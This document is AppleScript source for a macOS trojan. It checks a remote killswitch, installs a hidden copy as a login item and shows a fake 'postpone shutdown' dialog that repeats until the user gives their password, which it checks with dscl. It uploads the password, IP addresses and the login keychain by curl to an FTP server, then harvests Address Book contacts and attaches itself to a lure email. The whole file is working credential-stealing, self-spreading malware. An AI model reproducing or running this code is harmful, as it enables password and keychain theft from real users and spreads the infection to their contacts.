set theuser to do shell script "whoami"
try
	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
	set killswitch to (characters 1 through -1 of result) as text -- Get IP
	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
		try
			do shell script "rm -rf ~/public/." & theuser
		end try
		try
			do shell script "rm -rf " & (POSIX path of (path to me))
		end try
		return
	end if
end try

try
	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
end try
try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
end try

try
	set reso to POSIX path of (path to resource "Updater.app")
	set newreso to POSIX path of ("" & ufld & "Updater.app")
	do shell script "cp -r " & reso & " " & newreso
	tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item		
end try

try
	repeat
		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
		set passwd to text returned of quest
		if gave up of quest = true then -- If the user doesn't enter a password:
			do shell script "killall -u " & theuser -- Shutdown
		end if
		try
			do shell script "dscl . -passwd /Users/" & theuser & " " & passwd & " benwashere"
			do shell script "dscl . -passwd /Users/" & theuser & " benwashere " & passwd & "" -- Check if password is correct
			exit repeat
		on error
			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
		end try
	end repeat
	
	try
		set dte to (current date) as string
		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
		set WANIP to (characters 2 through -1 of result) as text -- Get IP
		set LANIP to (do shell script "ipconfig getifaddr en1")
	on error
		set WANIP to "not connected"
		set LANIP to "not connected"
	end try
	
	try
		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
	end try
	
	try
		tell application "Finder" to do shell script "curl -T ~/Public/" & ufld & "" & theuser & ".txt -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".txt" -- Upload text file to FTP server
	end try
	
	try
		set china to "~/Library/Keychains/login.keychain"
		do shell script "cp " & china & " " & ufld
		do shell script "mv /Users/" & theuser & "/Public/." & theuser & "/login.keychain /Users/" & theuser & "/Public/." & theuser & "/" & theuser & ".keychain" -- Copy keychain to hidden folder
	end try
	
	try
		tell application "Finder" to do shell script "curl -T " & ufld & "" & theuser & ".keychain -u <User>:<Password> ftp://<ftp address></path/to/folder/>" & theuser & "_" & WANIP & "_" & dte & ".keychain" -- Upload Keychain to FTP server
	end try
	
end try

try
	do shell script "open " & (POSIX path of (path to resource "DK.app"))
	delay 0.5
end try

try
	tell application "Mail"
		set theMessage to make new outgoing message with properties {visible:false, subject:"Awesome new Mac app!", content:"Hey, 
	
	Check out this new Mac application! You'll never use your computer the same way again ;)
	
	" & theuser & ""} -- Make email message
	end tell
	
	do shell script "cat /Users/" & theuser & "/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb | grep -a 'com'"
	set txt to 2nd paragraph of result
	set wrds to words of txt
	repeat with x from 1 to (count of wrds)
		if (item x in wrds) contains ".com" or (item x in wrds) contains ".org" or (item x in wrds) contains ".net" then
			set adr to ((item (x - 1) in wrds) & "@" & (item x in wrds)) as text
			tell application "Mail"
				tell theMessage
					make new to recipient at end of to recipients with properties {address:adr} -- Add recipients to message
				end tell
			end tell
		end if
	end repeat
	
	tell application "Mail"
		try
			tell content of theMessage
				make new attachment with properties {file name:(path to me)} at after last paragraph -- Attach the app
			end tell
		end try
		-- send theMessage
		quit
	end tell
end try

try
	set app_name to "DK"
	set the_pid to (do shell script "ps ax | grep " & (quoted form of app_name) & " | grep -v grep | awk '{print $1}'")
	if the_pid is not "" then do shell script ("kill -9 " & the_pid)
end try